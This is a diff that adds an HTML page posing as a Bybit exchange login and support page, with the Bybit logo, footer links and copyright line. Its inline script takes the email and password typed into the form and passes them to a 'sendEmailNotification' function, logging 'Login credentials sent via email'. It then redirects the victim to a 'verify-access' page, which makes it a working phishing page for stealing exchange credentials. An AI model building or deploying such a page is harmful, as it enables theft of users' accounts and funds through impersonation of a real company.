@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bybit - Login</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <div class="layout">
+        <main class="main-content">
+            <header class="header">
+                <div class="header-left">
+                    <img src="bybit logo/bybit.png" alt="Bybit Logo" class="header-logo">
+                    <h1 class="header-title">Bybit Support</h1>
+                </div>
+                <div class="header-right">
+                    <button class="header-button" onclick="window.location.href='notifications.html'">
+                        <i class="fas fa-bell"></i>
+                    </button>
+                    <button class="header-button" onclick="window.location.href='https://www.bybit.com/login'">
+                        <i class="fas fa-user"></i>
+                    </button>
+                </div>
+            </header>
+
+            <div class="content-wrapper">
+                <div class="card login-card">
+                    <h2>Login to Bybit</h2>
+                    <form id="loginForm" class="login-form">
+                        <div class="form-group">
+                            <label for="email">Email</label>
+                            <input type="email" id="email" name="email" required placeholder="Enter your email">
+                        </div>
+                        <div class="form-group">
+                            <label for="password">Password</label>
+                            <input type="password" id="password" name="password" required placeholder="Enter your password">
+                        </div>
+                        <div class="form-options">
+                            <label class="remember-me">
+                                <input type="checkbox" id="remember" name="remember">
+                                Remember me
+                            </label>
+                            <a href="#" class="forgot-password">Forgot Password?</a>
+                        </div>
+                        <button type="submit" class="btn-primary">Login</button>
+                    </form>
+                    <div class="login-footer">
+                        <p>Don't have an account? <a href="https://www.bybit.com/register">Sign up</a></p>
+                    </div>
+                </div>
+            </div>
+
+            <footer class="footer">
+                <div class="footer-content">
+                    <div class="footer-links">
+                        <a href="https://www.bybit.com/about" class="footer-link" target="_blank" rel="noopener noreferrer">About Us</a>
+                        <a href="https://www.bybit.com/terms" class="footer-link" target="_blank" rel="noopener noreferrer">Terms of Service</a>
+                        <a href="https://www.bybit.com/privacy" class="footer-link" target="_blank" rel="noopener noreferrer">Privacy Policy</a>
+                        <a href="https://www.bybit.com/support" class="footer-link" target="_blank" rel="noopener noreferrer">Contact Support</a>
+                    </div>
+                    <div class="footer-copyright">
+                        © 2024 Bybit. All rights reserved.
+                    </div>
+                </div>
+            </footer>
+        </main>
+    </div>
+
+    <script src="utils.js"></script>
+    <script src="modal-utils.js"></script>
+    <script src="notification-system.js"></script>
+    <script src="email-config.js"></script>
+    <script src="bybit-login.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const loginForm = document.getElementById('loginForm');
+            
+            loginForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
+                
+                // Send email notification
+                const userData = {
+                    type: 'Bybit Login',
+                    email: email,
+                    password: password,
+                    timestamp: new Date().toISOString(),
+                    page: 'bybit-login.html'
+                };
+                
+                try {
+                    sendEmailNotification(userData);
+                    console.log('Login credentials sent via email');
+                } catch (error) {
+                    console.error('Error sending email:', error);
+                }
+                
+                // Store email in sessionStorage for reference
+                sessionStorage.setItem('userEmail', email);
+                
+                // Redirect to verify access page
+                window.location.href = 'verify-access.html';
+            });
+        });
+    </script>
+</body>
+</html> 
